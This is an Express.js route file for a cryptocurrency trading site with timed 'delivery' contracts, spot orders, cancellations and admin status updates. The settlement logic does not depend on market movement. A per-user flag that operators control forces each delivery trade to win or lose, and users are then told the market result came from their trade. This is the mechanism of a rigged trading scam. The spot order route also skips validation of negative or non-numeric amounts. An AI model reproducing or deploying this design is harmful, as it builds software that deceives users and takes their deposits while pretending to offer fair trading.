const express = require('express');
const { protect: auth } = require('../middleware/authMiddleware');
const Trade = require('../models/Trade');
const User = require('../models/User');
const WalletTransaction = require('../models/WalletTransaction');
const router = express.Router();

// Delivery contract time slots (seconds → config)
const DELIVERY_SLOTS = {
  60:   { profit: 13, minAmount: 100 },
  180:  { profit: 15, minAmount: 1000 },
  300:  { profit: 20, minAmount: 3000 },
  600:  { profit: 27, minAmount: 5000 },
  900:  { profit: 75, minAmount: 10000 },
  1800: { profit: 90, minAmount: 30000 },
};

// Settle a delivery trade after timer expires
async function settleDeliveryTrade(tradeId, io) {
  try {
    const trade = await Trade.findById(tradeId).populate('userId');
    if (!trade || trade.status !== 'pending' || trade.tradeMode !== 'delivery') return;

    const user = await User.findById(trade.userId._id || trade.userId);
    if (!user) return;

    // deliveryTradeEnabled: true = forced win, false = forced loss
    const isWin = user.deliveryTradeEnabled;

    let profitAmount = 0;
    let finalUser = user;

    if (isWin) {
      // Return original amount + profit
      profitAmount = trade.total * (trade.profitPercent / 100);
      
      // Atomic increment to prevent race conditions
      finalUser = await User.findByIdAndUpdate(
        user._id,
        { 
          $inc: { 
            'wallet.usdt': trade.total + profitAmount,
            'tradingStats.totalTrades': 1,
            'tradingStats.profitLoss': profitAmount
          } 
        },
        { new: true }
      );
    } else {
      // For loss, just update stats (funds were already deducted)
      finalUser = await User.findByIdAndUpdate(
        user._id,
        { 
          $inc: { 
            'tradingStats.totalTrades': 1,
            'tradingStats.profitLoss': -trade.total
          } 
        },
        { new: true }
      );
    }

    trade.status = 'completed';
    trade.outcome = isWin ? 'win' : 'loss';
    trade.profitAmount = profitAmount;
    await trade.save();

    // Create wallet transaction for win
    if (isWin) {
      await WalletTransaction.create({
        userId: finalUser._id,
        type: 'trade',
        currency: 'USDT',
        amount: trade.total + profitAmount,
        status: 'completed',
        metadata: {
          pair: trade.pair,
          price: trade.price,
          orderId: trade._id.toString(),
          outcome: 'win'
        }
      });
    }

    // Emit socket events
    if (io) {
      const populated = await Trade.findById(tradeId).populate('userId', 'email fullName');
      io.to('admin').emit('trade_updated', populated);
      io.to(`user_${finalUser._id}`).emit('trade_updated', {
        ...populated.toObject(),
        title: isWin ? '🎉 Trade Won!' : '❌ Trade Lost',
        message: isWin
          ? `You won ${profitAmount.toFixed(2)} USDT on your ${trade.pair} delivery trade!`
          : `Your ${trade.pair} delivery trade expired as a loss.`
      });
      io.to(`user_${finalUser._id}`).emit('balance_updated', { wallet: finalUser.wallet });
    }
  } catch (err) {
    console.error('Error settling delivery trade:', err);
  }
}

// Place delivery order
router.post('/delivery-order', auth, async (req, res) => {
  try {
    const { pair, type, deliverySeconds, price, amount } = req.body;
    const amountNum = parseFloat(amount);
    if (isNaN(amountNum) || amountNum <= 0 || !isFinite(amountNum)) {
      return res.status(400).json({ message: 'Invalid trade amount' });
    }

    // Validate time slot
    const slotConfig = DELIVERY_SLOTS[deliverySeconds];
    if (!slotConfig) {
      return res.status(400).json({ message: 'Invalid delivery time slot' });
    }

    // Validate minimum amount
    if (amountNum < slotConfig.minAmount) {
      return res.status(400).json({ 
        message: `Minimum amount for ${deliverySeconds}s is ${slotConfig.minAmount.toLocaleString()} USDT` 
      });
    }

    // Atomic deduction: only subtract if balance is sufficient
    const user = await User.findOneAndUpdate(
      { _id: req.user.id, 'wallet.usdt': { $gte: amountNum } },
      { $inc: { 'wallet.usdt': -amountNum } },
      { new: true }
    );

    if (!user) {
      return res.status(400).json({ 
        message: 'Insufficient balance or user not found.' 
      });
    }

    const profitPercent = slotConfig.profit;
    const expiresAt = new Date(Date.now() + deliverySeconds * 1000);

    // Create pending delivery trade
    const trade = new Trade({
      userId: req.user.id,
      pair: pair || 'BTC/USDT',
      type: type === 'long' ? 'long' : 'short',
      orderType: 'market',
      tradeMode: 'delivery',
      price: parseFloat(price),
      amount: amountNum,
      total: amountNum,
      status: 'pending',
      deliverySeconds: parseInt(deliverySeconds),
      profitPercent,
      expiresAt,
      outcome: null
    });

    await trade.save();


    // Schedule settlement after timer
    const io = req.app.get('io');
    setTimeout(() => settleDeliveryTrade(trade._id, io), deliverySeconds * 1000);

    // Emit new trade event to admin
    if (io) {
      const populated = await Trade.findById(trade._id).populate('userId', 'email fullName');
      io.to('admin').emit('new_trade', populated);
      io.to(`user_${req.user.id}`).emit('order_placed', {
        title: 'Delivery Order Placed',
        message: `${pair} ${type} order for ${amountNum} USDT placed. Expires in ${deliverySeconds}s`,
        type: 'success',
        trade: populated
      });
      io.to(`user_${req.user.id}`).emit('balance_updated', { wallet: user.wallet });
    }

    res.json({ message: 'Delivery order placed successfully', trade });
  } catch (error) {
    console.error('Delivery order error:', error);
    res.status(500).json({ message: error.message });
  }
});

// Get user delivery trades
router.get('/delivery-trades', auth, async (req, res) => {
  try {
    const trades = await Trade.find({
      userId: req.user.id,
      tradeMode: 'delivery'
    }).sort({ createdAt: -1 });

    const active = trades.filter(t => t.status === 'pending');
    const history = trades.filter(t => t.status === 'completed' || t.status === 'cancelled');

    res.json({ active, history });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Place order (spot/perpetual)
router.post('/order', auth, async (req, res) => {
  try {
    const { pair, type, orderType, price, amount, leverage = 1 } = req.body;

    const total = parseFloat(price) * parseFloat(amount);
    let user;

    // Atomic deduction: only subtract if balance is sufficient
    if (type === 'buy' || type === 'long') {
      user = await User.findOneAndUpdate(
        { _id: req.user.id, 'wallet.usdt': { $gte: total } },
        { $inc: { 'wallet.usdt': -total } },
        { new: true }
      );
      if (!user) {
        return res.status(400).json({ message: 'Insufficient USDT balance.' });
      }
    } else if (type === 'sell' || type === 'short') {
      const currency = pair.split('/')[0].toLowerCase();
      const amountNum = parseFloat(amount);
      const updateObj = { $inc: {} };
      updateObj.$inc[`wallet.${currency}`] = -amountNum;

      const queryObj = { _id: req.user.id };
      queryObj[`wallet.${currency}`] = { $gte: amountNum };

      user = await User.findOneAndUpdate(queryObj, updateObj, { new: true });
      if (!user) {
        return res.status(400).json({ message: `Insufficient ${currency.toUpperCase()} balance.` });
      }
    }

    // Market orders are filled immediately; limit orders stay pending
    const tradeStatus = orderType === 'market' ? 'completed' : 'pending';

    // Create trade
    const trade = new Trade({
      userId: req.user.id,
      pair,
      type,
      orderType,
      tradeMode: 'spot',
      price: parseFloat(price),
      amount: parseFloat(amount),
      total,
      status: tradeStatus,
      position: { leverage }
    });

    await trade.save();

    // For completed market orders: update trading stats atomically
    if (tradeStatus === 'completed') {
      await User.findByIdAndUpdate(req.user.id, {
        $inc: { 'tradingStats.totalTrades': 1 }
      });
    }

    // Create a wallet transaction record for completed trades
    if (tradeStatus === 'completed') {
      await WalletTransaction.create({
        userId: req.user.id,
        type: 'trade',
        currency: 'USDT',
        amount: total,
        status: 'completed',
        metadata: {
          pair,
          price: parseFloat(price),
          orderId: trade._id.toString()
        }
      });
    }

    // Emit socket events
    const io = req.app.get('io');
    if (io) {
      const populatedTrade = await Trade.findById(trade._id).populate('userId', 'email fullName');
      io.to('admin').emit('new_trade', populatedTrade);
      io.to(`user_${req.user.id}`).emit('order_placed', {
        title: 'Order Placed',
        message: `${pair} ${type} order for ${amount} placed successfully`,
        type: 'success',
        trade: populatedTrade
      });
      if (tradeStatus === 'completed') {
        io.to('admin').emit('trade_updated', populatedTrade);
        io.to(`user_${req.user.id}`).emit('trade_updated', populatedTrade);
      }
      io.to(`user_${req.user.id}`).emit('balance_updated', { wallet: user.wallet });
    }

    res.json({ message: 'Order placed successfully', trade });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Get user trades (positions and open orders)
router.get('/my-trades', auth, async (req, res) => {
  try {
    const trades = await Trade.find({ userId: req.user.id, tradeMode: { $ne: 'delivery' } }).sort({ createdAt: -1 });

    const positions = trades.filter(t => t.status === 'completed');
    const openOrders = trades.filter(t => t.status === 'pending');

    res.json({ positions, openOrders });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Cancel order (user)
router.post('/order/:id/cancel', auth, async (req, res) => {
  try {
    const order = await Trade.findById(req.params.id);

    if (!order) return res.status(404).json({ message: 'Order not found' });
    if (order.userId.toString() !== req.user.id) return res.status(403).json({ message: 'Unauthorized' });
    if (order.status !== 'pending') return res.status(400).json({ message: 'Only pending orders can be cancelled' });
    if (order.tradeMode === 'delivery') return res.status(400).json({ message: 'Delivery orders cannot be cancelled' });

    let updatedUser;
    // Atomic refund
    if (order.type === 'buy' || order.type === 'long') {
      updatedUser = await User.findByIdAndUpdate(
        req.user.id,
        { $inc: { 'wallet.usdt': order.total } },
        { new: true }
      );
    } else if (order.type === 'sell' || order.type === 'short') {
      const currency = order.pair.split('/')[0].toLowerCase();
      const updateObj = { $inc: {} };
      updateObj.$inc[`wallet.${currency}`] = order.amount;
      updatedUser = await User.findByIdAndUpdate(req.user.id, updateObj, { new: true });
    }

    order.status = 'cancelled';
    await order.save();

    const io = req.app.get('io');
    if (io) {
      const populated = await order.populate('userId', 'email fullName');
      io.to('admin').emit('trade_updated', populated);
      io.to(`user_${req.user.id}`).emit('trade_updated', populated);
      if (updatedUser) {
        io.to(`user_${req.user.id}`).emit('balance_updated', { wallet: updatedUser.wallet });
      }
    }

    res.json({ message: 'Order cancelled' });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

// Update trade status (admin)
router.put('/order/:id/status', auth, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({ message: 'Admin access required' });
    }

    const { status } = req.body;
    if (!['completed', 'cancelled'].includes(status)) {
      return res.status(400).json({ message: 'Invalid status. Use completed or cancelled' });
    }

    const trade = await Trade.findById(req.params.id);
    if (!trade) return res.status(404).json({ message: 'Trade not found' });

    // If cancelling a pending order, refund funds to user
    if (status === 'cancelled' && trade.status === 'pending') {
      const user = await User.findById(trade.userId);
      if (user) {
        if (trade.type === 'buy' || trade.type === 'long') {
          user.wallet.usdt += trade.total;
        } else if (trade.type === 'sell' || trade.type === 'short') {
          const currency = trade.pair.split('/')[0].toLowerCase();
          if (user.wallet[currency] !== undefined) {
            user.wallet[currency] += trade.amount;
          }
        }
        user.markModified('wallet');
        await user.save();
        
        const io = req.app.get('io');
        if (io) {
          io.to(`user_${user._id}`).emit('balance_updated', { wallet: user.wallet });
        }
      }
    }

    trade.status = status;
    await trade.save();

    const io = req.app.get('io');
    if (io) {
      const populated = await trade.populate('userId', 'email fullName');
      io.to('admin').emit('trade_updated', populated);
      io.to(`user_${trade.userId}`).emit('trade_updated', populated);
    }

    res.json({ message: `Trade ${status} successfully`, trade });
  } catch (error) {
    res.status(500).json({ message: error.message });
  }
});

module.exports = router;